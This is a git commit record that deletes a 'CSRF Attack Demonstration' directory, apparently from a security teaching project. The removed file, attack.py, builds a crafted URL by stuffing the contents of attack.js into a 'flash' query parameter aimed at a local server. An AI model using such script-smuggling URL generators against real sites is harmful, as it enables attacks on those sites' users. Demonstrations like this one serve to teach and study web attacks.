c9b06661b1120a1842949f36d16400f730fbae96
Hong Rae Cho <rollony215@gmail.com>
2021-07-08 18:49:42 +0900

    Delete CSRF Attack Demonstration directory

--- CSRF Attack Demonstration/attack.py
+++
@@ -1,5 +0,0 @@
-from urllib.parse import urlencode
-with open('attack.js') as f: #generates an attacker-generated URL
-    query = {'flash': 'Thanks. brandon'+f.read().strip().replace('\n', ' ')}
-
-print('http://localhost:5000/?' + urlencode(query))
